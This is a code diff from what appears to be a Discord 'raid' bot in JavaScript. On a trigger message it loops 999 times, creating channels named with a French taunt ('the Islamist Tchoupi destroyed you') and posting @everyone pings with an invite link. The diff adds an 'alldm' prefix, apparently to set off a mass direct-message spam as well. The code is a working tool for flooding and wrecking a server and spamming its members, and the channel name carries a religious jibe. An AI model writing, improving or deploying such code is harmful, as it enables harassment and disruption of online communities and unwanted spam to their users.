@@ -246,12 +246,12 @@ if(message.content.includes("serversjoin")){
                     message.channel.send("roles").then(m => m.delete());
                     message.channel.send("issou").then(m => m.delete());
                       for(var i = 0; i < 999; i++){
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("!everyone ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
-                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/R3K862v &.789 ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("alldm !everyone ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("alldm @everyone https://discord.gg/R3K862v &.789 ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("alldm @everyone https://discord.gg/R3K862v &.789."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("alldm @everyone https://discord.gg/R3K862v &.789 ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("alldm @everyone https://discord.gg/R3K862v &.789 ."))
+                          message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("alldm @everyone https://discord.gg/R3K862v &.789 ."))
 
                       }
                     }
